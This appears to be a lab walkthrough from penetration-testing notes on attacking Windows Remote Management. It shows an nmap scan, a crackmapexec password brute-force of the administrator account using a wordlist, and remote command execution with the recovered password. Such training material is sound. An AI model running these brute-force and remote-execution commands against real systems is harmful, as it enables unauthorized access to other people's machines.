# Exploiting WinRM

WinRM typically runs on port 5985 or 5986.

```sh
root@attackdefense:~# nmap 10.5.28.237 -p5000-6000
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-31 13:47 IST
Nmap scan report for 10.5.28.237
Host is up (0.0019s latency).
Not shown: 1000 closed ports
PORT     STATE SERVICE
5985/tcp open  wsman
```

Here we can see it open.

To connect to WinRM we can use a tool called crackmapexec:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# crackmapexec winrm 10.5.28.237 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
WINRM       10.5.28.237     5985   NONE             [-] None\administrator:hello "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.28.237     5985   NONE             [-] None\administrator:elizabeth "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.28.237     5985   NONE             [-] None\administrator:hottie "Failed to authenticate the user administrator with ntlm"
<strong>WINRM       10.5.28.237     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
</strong></code></pre>

Now as we got winrm credentials, we can use crackmapexec again to execute arbitrary command:

```sh
root@attackdefense:~# crackmapexec winrm 10.5.28.237 -u administrator -p tinkerbell -x "whoami"                                            
WINRM       10.5.28.237     5985   NONE             [*] http://10.5.28.237:5985/wsman
WINRM       10.5.28.237     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.5.28.237     5985   NONE             [+] Executed command
WINRM       10.5.28.237     5985   NONE             server\administrator
```

To get the command line session we can use another tool named evil-winrm

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

